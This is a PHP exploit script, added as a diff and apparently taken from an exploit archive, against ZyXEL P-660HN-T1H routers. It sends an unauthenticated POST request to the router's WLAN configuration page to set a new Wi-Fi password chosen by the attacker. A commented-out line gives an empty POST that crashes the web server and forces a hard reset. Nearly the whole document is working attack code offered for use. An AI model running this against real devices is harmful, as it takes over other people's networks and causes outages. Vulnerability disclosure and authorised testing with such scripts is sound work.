@@ -1,0 +1,58 @@
+<?php
+/*
+Exploit Title   : ZYXEL remote configuration editor / Web Server DoS
+Date            : 23 April 2015
+Exploit Author  : Koorosh Ghorbani
+Site            : http://8thbit.net/
+Vendor Homepage : http://www.zyxel.com/
+Platform        : Hardware 
+Tested On       : ZyXEL P-660HN-T1H_IPv6
+Firmware Version: 1.02(VLU.0)
+--------------------------
+ Unattended remote access  
+--------------------------
+ZYXEL Embedded Software does not check Cookies And Credentials on POST method so 
+attackers could changes settings and view pages with post method .
+
+--------------------------
+      DoS Web Server
+--------------------------
+sending empty Post to admin pages will crash internal web server and router needs
+to hard reset .
+
+*/
+$banner = "   ___ _______ _     ____  _ _______ \r\n" . "  / _ \__   __| |   |  _ \(_)__   __|\r\n" ." | (_) | | |  | |__ | |_) |_   | |   \r\n" ."  > _ <  | |  | '_ \|  _ <| |  | |   \r\n" ." | (_) | | |  | | | | |_) | |  | |   \r\n" ."  \___/  |_|  |_| |_|____/|_|  |_|   \r\n" ."                                     \r\n" ."                                     \r\n";
+print $banner;
+function Post($packet,$host)
+{
+	try {
+		$curl = curl_init();
+		curl_setopt($curl, CURLOPT_URL, $host);
+		curl_setopt($curl, CURLOPT_POST, 1);
+		curl_setopt($curl, CURLOPT_POSTFIELDS, $packet);
+		curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0");
+		curl_setopt($curl, CURLOPT_REFERER, "Referer: http://192.168.1.1/cgi-bin/WLAN_General.asp");
+		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+		$result = curl_exec($curl);
+		curl_close($curl);
+		return $result;
+	}catch (Exception $e ){
+		echo $e->getMessage();
+		return "" ;
+	}
+}
+if(sizeof($argv) < 3) {
+	print "Usage : $argv[0] 192.168.1.1 NewWifiPassword\n";
+    exit(1);
+}
+$host = $argv[1];
+$password = urlencode($argv[2]);
+$packet= "access=0&DoScan=0&ChannelDoScan=0&WlanQosFlag=0&HtExtcha=0&IsPtGui=0&SecurityIndexOriginal=3&EnableWLAN=on&SSID_INDEX=0&EnableWLanFlag=1&CountryRegion=1&CountryRegion0=0&CountryRegion1=1&CountryRegion2=2&CountryRegion3=3&CountryRegion5=5&CountryRegion6=6&Countries_Channels=IRAN&Channel_ID=11&HideSsidFlag=0&WPACompatileFlag=WPA2PSK&EncrypType=TKIPAES&PreSecurity_Sel=WPA2PSK&Security_Sel=WPA2PSK&WLANCfgPphrase=&WEP_Key1=&DefWEPKey=1&WLANCfgPSK=$password&WLANCfgAuthenTimeout=1800&WLANCfgIdleTimeout=3600&WLANCfgWPATimer=1800&WLANCfgRadiusServerAddr=0.0.0.0&WLANCfgRadiusServerPort=1812&WLANCfgRadiusServerKey=&Qos_Sel=None&doSubmitFlag=0" ;
+$target = "http://$host/cgi-bin/WLAN_General.asp";
+if(strlen(Post($packet,$target)) > 0){
+    print "Seems Changed !";
+}else{
+    print "Humm , No Chance !";
+}
+//DoS : Post("",$target) ;
+?>
